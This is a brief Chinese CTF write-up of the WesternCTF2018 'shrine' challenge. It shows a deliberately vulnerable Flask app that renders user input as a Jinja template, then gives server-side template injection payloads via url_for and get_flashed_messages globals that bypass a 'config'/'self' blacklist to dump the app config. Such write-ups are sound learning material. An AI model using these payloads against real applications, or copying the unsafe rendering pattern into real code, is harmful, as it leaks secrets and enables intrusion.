### [WesternCTF2018]shrine

----

```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
    
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)

```

模板注入题,我们需要去访问config中的'FLAG'

但是这里有黑名单过滤了config

```python
app.config['FLAG'] = os.environ.pop('FLAG')
```

> `current_app` 是 Flask 中的一个上下文变量，用于在请求上下文中引用当前活动的 Flask 应用实例。它通常在视图函数、模板或其他与请求相关的代码中使用，而不需要在函数参数中显式传递应用实例。
>
> 简单说这个变量就代表当前文件

```
/shrine/{{url_for.__globals__}}
/shrine/{{url_for.__globals__['current_app'].config}}
```

*利用python对象之间的引用关系来调用被禁用的函数对象*

> `url_for()` 方法:
>
> url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。
>
> `get_flashed_messages()` 方法：
>
> 返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。



还可以使用`get_flashed_messages`

```
/shrine/{{get_flashed_messages.__globals__['current_app'].config}}
```



学到了